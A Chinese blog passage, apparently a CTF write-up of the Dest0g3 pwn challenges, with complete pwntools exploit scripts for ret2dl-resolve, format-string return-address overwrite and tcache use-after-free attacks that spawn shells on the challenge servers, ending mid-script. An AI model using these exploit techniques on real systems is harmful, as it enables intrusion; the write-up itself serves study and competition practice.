<p>å½“ç”¨æˆ·æ€ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸æ€çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠæ‰€æœ‰çš„å¯„å­˜å™¨çš„å€¼å‹å…¥å†…æ ¸æ ˆåº•ï¼Œä¹Ÿå°±ç»„æˆäº†<code>pt_regs</code>ç»“æ„ä½“ã€‚å…¶ä¸­<code>r15~r8</code>å¯„å­˜å™¨æ˜¯å¯ä»¥åœ¨ç”¨æˆ·æ€é€šè¿‡å†…è”æ±‡ç¼–æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶å†…æ ¸æ ˆåº•çš„æ•°æ®äº†ï¼Œå¦‚æœæˆ‘ä»¬è¿˜èƒ½æ§åˆ¶ä¸€æ¬¡ç¨‹åºæµæ¯”å¦‚è¯´è™šè¡¨ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå½“è°ƒç”¨è¿™ä¸ªæŒ‡é’ˆçš„æ—¶å€™ï¼Œä»–åˆ°å†…æ ¸æ ˆåº•çš„åç§»æ˜¯å›ºå®šçš„ï¼Œé‚£å°±å¯ä»¥é€šè¿‡æŠŠå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆgadgetè·³åˆ°<code>r15~r8</code>ä¹‹é—´å®Œæˆrop</p>
<p>gadgetçš„æ¿å­ï¼š<code>add rsp, val ; ret</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/Dest0g3-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/27/Dest0g3-pwn/" class="post-title-link" itemprop="url">Dest0g3-pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-27 13:58:46 / ä¿®æ”¹æ—¶é—´ï¼š13:59:26" itemprop="dateCreated datePublished" datetime="2022-05-27T13:58:46+08:00">2022-05-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Dest0g3-pwn"><a href="#Dest0g3-pwn" class="headerlink" title="Dest0g3  pwn"></a>Dest0g3  pwn</h1><p>ç®—æ˜¯æ¯”è¾ƒç®€å•çš„æ¯”èµ›ï¼Œæ¯•ç«Ÿæˆ‘éƒ½éƒ½åšå‡ºæ¥è¿™ä¹ˆå¤šé¢˜ï¼Œæ‰€æœ‰çš„é¢˜ç›®æ¼æ´éƒ½æ˜¯è£¸çš„ï¼Œæ‰€ä»¥éš¾ç‚¹éƒ½åœ¨å¦‚ä½•åˆ©ç”¨æ¼æ´èº«ä¸Šï¼Œå…¶ä¸­åé¢ä¸‰é“å †é¢˜éƒ½æ˜¯æ”»å‡»ioç»“æ„ï¼Œç¡®å®æœ‰ç‚¹æ¶å¿ƒã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527125626074.png" alt="image-20220527125626074"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527125647780.png" alt="image-20220527125647780"></p>
<h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰æ‰¾è§libcçš„ç‰ˆæœ¬ï¼ŒåŠ ä¸Šå¼€äº†å»¶è¿Ÿç»‘å®šï¼Œå¿ƒä¸€æ¨ªç›´æ¥æ‹¿ret2dlåšäº†ï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ret2dlæ”»å‡»ã€‚</p>
<p>ä¸»è¦ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dynamicæ®µ</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword     d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">extern</span> Elf32_Dyn_DYNAMIC[];</span><br><span class="line"></span><br><span class="line"><span class="comment">//rel.plt</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//dynsym</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼Œ_dl_runtime_resolveå‡½æ•°é€šè¿‡reloc_argå¯»å€åˆ°è¿™ä¸ªå‡½æ•°å¯¹åº”çš„é‡å®šä½è¡¨(ret.plt)ï¼Œè¿™ä¸ªå¯»å€æ˜¯åç§»å¯»å€ï¼Œç„¶åé€šè¿‡é‡å®šä½è¡¨çš„r_infoå¯»å€åˆ°å¯¹åº”çš„dynsymç¬¦å·é‡å®šä½è¡¨ï¼Œè¿™ä¸ªå¯»å€æ˜¯ä¸‹æ ‡å¯»å€ï¼Œè¦æ³¨æ„ç»“æ„ä½“çš„å¤§å°ï¼Œç„¶åé€šè¿‡ç»“æ„ä½“çš„st_nameå¯»å€åˆ°å¯¹åº”çš„dynstrï¼Œè¿™ä¸ªå¯»å€æ˜¯åç§»å¯»å€ï¼Œæ‰¾åˆ°çš„å°±æ˜¯å‡½æ•°çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²è¿”å›å¯¹åº”å‡½æ•°åœ°å€ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220527131543243.png" alt="image-20220527131543243"></p>
<p>æ”»å‡»çš„æ–¹æ³•å°±æ˜¯è‡ªå·±æ„é€ å®Œæ•´çš„ä¸€å¥—ret.plt,dynsym,dynstr,ç„¶åæ„é€ reloc_arg,è®©å…¶æŒ‡å‘è‡ªå·±ä¼ªé€ çš„ret.pltå°±å¥½äº†ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29767</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rbx=<span class="number">0x08049022</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">hackme_addr=<span class="number">0x08049216</span></span><br><span class="line">pop_rbp=<span class="number">0x080494e3</span></span><br><span class="line">lea_ret=<span class="number">0x08049185</span></span><br><span class="line">_dl_runtime_resolve=<span class="number">0x8049030</span></span><br><span class="line">scanf_plt=elf.plt[<span class="string">&quot;__isoc99_scanf&quot;</span>]</span><br><span class="line">rel_plt=<span class="number">0x080483fc</span></span><br><span class="line">dynstr=<span class="number">0x08048308</span></span><br><span class="line">dynsym=<span class="number">0x08048248</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_num</span>(<span class="params">num</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input num&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_num</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_avg</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *&#123;0&#125;&#x27;.format(0x08049407))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input the length of array:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(-<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x804ca00</span>)</span><br><span class="line">    add_num(scanf_plt)</span><br><span class="line">    add_num(lea_ret)</span><br><span class="line">    add_num(<span class="number">0x0804A023</span>)</span><br><span class="line">    add_num(<span class="number">0x804ca00</span>+<span class="number">4</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(hackme_addr))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(hackme_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input the length of array:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add_num(<span class="number">1</span>)</span><br><span class="line">    add_num(-<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x804c2b0</span>)</span><br><span class="line">    reloc_arg=<span class="number">0x4620</span></span><br><span class="line">    add_num(_dl_runtime_resolve)<span class="comment">#0x804ca08</span></span><br><span class="line">    add_num(reloc_arg)<span class="comment">#0x804ca0c</span></span><br><span class="line">    add_num(hackme_addr)<span class="comment">#0x804ca10</span></span><br><span class="line">    add_num(<span class="number">0x804ca48</span>)<span class="comment">#0x804ca14  /bin/sh_addr</span></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca18</span></span><br><span class="line">    <span class="comment">#fake_Elf32_Rel</span></span><br><span class="line">    add_num(elf.got[<span class="string">&quot;printf&quot;</span>])<span class="comment">#0x804ca1c</span></span><br><span class="line">    fake_r_info=(<span class="number">0x47e</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">    add_num(fake_r_info)<span class="comment">#0x804ca20</span></span><br><span class="line"></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca24</span></span><br><span class="line">    <span class="comment">#fake_Elf32_Sym</span></span><br><span class="line">    fake_st_name=<span class="number">0x4734</span><span class="comment">#0x804ca28</span></span><br><span class="line">    add_num(fake_st_name)<span class="comment">#0x804ca2c</span></span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0</span>)</span><br><span class="line">    add_num(<span class="number">0x12</span>)</span><br><span class="line">    add_num(<span class="number">1</span>)</span><br><span class="line">    add_num(<span class="number">0x74737973</span>)<span class="comment">#0x804ca3c</span></span><br><span class="line">    add_num(<span class="number">0x6d65</span>)<span class="comment">#0x804ca40</span></span><br><span class="line">    add_num(<span class="number">1</span>)<span class="comment">#0x804ca44</span></span><br><span class="line">    add_num(<span class="number">0x6e69622f</span>)<span class="comment">#0x804ca48</span></span><br><span class="line">    add_num(<span class="number">0x68732f</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your choice:\n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>å…¶å®æ²¡å¿…è¦è¿™ä¹ˆéº»çƒ¦çš„ï¼Œç›´æ¥æ‹¿ret2libcæ‰“å°±å¥½äº†</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,æˆ‘ç›´æ¥æ”¹è¿”å›åœ°å€ä¸ºoggæ‹¿shelläº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/rootzhang/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25438</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xde78c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde78f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde792 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;est0g3?\n&quot;</span>,timeout=<span class="number">100000</span>)</span><br><span class="line">    <span class="comment">#sleep(10)</span></span><br><span class="line">    sh.send(content.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&quot;b *(0x555555554000+&#123;0&#125;)&quot;.format(0x1210))</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b printf&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pay=<span class="string">&#x27;%10$p %9$p&#x27;</span></span><br><span class="line">    <span class="comment">#pay=&#x27;%10$p %9$p %10$hhn&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    m=sh.recv(<span class="number">29</span>)</span><br><span class="line">    <span class="built_in">print</span> m</span><br><span class="line">    fmt_stack1=<span class="built_in">int</span>(m[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(fmt_stack1)</span><br><span class="line">    fmt_stack3=fmt_stack1-<span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line">    libc_addr=<span class="built_in">int</span>(m[<span class="number">15</span>:],<span class="number">16</span>)-<span class="number">0x28565</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(fmt_stack3&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    ogg_addr=<span class="number">0xde78f</span>+libc_addr</span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8f</span>)+<span class="string">&#x27;c%39$hhn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((fmt_stack3&amp;<span class="number">0xff</span>)+<span class="number">1</span>)+<span class="string">&#x27;c%10$hhn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    pay=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg_addr&amp;<span class="number">0xffff00</span>)&gt;&gt;<span class="number">8</span>)+<span class="string">&#x27;c%39$hn\x00&#x27;</span></span><br><span class="line">    printf(pay)</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;111111111111111111&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>é«˜ç‰ˆæœ¬çš„uaf,æ³¨æ„tcacheçš„fdçš„å¼‚æˆ–æ“ä½œå°±å¥½ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27314</span>)</span><br><span class="line"><span class="comment">#sh=process(&quot;./pwn&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me its size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: \n&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;4. show\n: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me the index: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me its content: &quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    new(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    heap_addr2=((u64(sh.recv(<span class="number">8</span>))&lt;&lt;<span class="number">12</span>) &amp; <span class="number">0xffffffffffffffff</span>)+<span class="number">0x380</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    free_hook=libc.sym[<span class="string">&quot;__free_hook&quot;</span>]+libc_addr</span><br><span class="line">    heap_addr1=(((u64(sh.recv(<span class="number">8</span>))^heap_addr2)&lt;&lt;<span class="number">12</span>)&amp;<span class="number">0xffffffffffffffff</span>)+<span class="number">0x330</span></span><br><span class="line">    <span 